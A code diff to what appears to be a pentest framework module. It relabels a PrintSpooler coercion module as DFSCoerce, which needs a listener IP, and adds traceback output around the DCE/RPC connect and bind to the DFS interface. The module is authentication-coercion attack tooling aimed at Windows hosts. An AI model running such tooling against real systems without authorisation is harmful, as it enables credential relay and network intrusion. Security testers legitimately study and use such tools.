@@ -1,4 +1,5 @@
 import sys
+import traceback
 from ctypes import *
 import socket
 import struct
@@ -23,7 +24,7 @@ class Module:
 
     def run(self, target, args, creds, timeout):
         if len(args) != 1:
-            Output.error({'target': 'smb://%s:%d' % (target['hostname'], target['port']), 'message': 'PrintSpooler module requires 1 arg: -m printspooler <listener_ip>'})
+            Output.error({'target': 'smb://%s:%d' % (target['hostname'], target['port']), 'message': 'DFSCoerce module requires 1 arg: -m dfscoerce <listener_ip>'})
             return
 
         domain = creds['domain'] if 'domain' in creds else None
@@ -116,12 +117,14 @@ class TriggerAuth():
             dce.connect()
         except Exception as e:
             #print("Something went wrong, check error status => %s" % str(e))
+            traceback.print_exc()
             return "Something went wrong, check error status => %s" % str(e)
 
         try:
             dce.bind(uuidtup_to_bin(('4FC742E0-4A10-11CF-8273-00AA004AE673', '3.0')))
         except Exception as e:
             #print("Something went wrong, check error status => %s" % str(e))
+            traceback.print_exc()
             return "Something went wrong, check error status => %s" % str(e)
         #print("[+] Successfully bound!")
         return dce
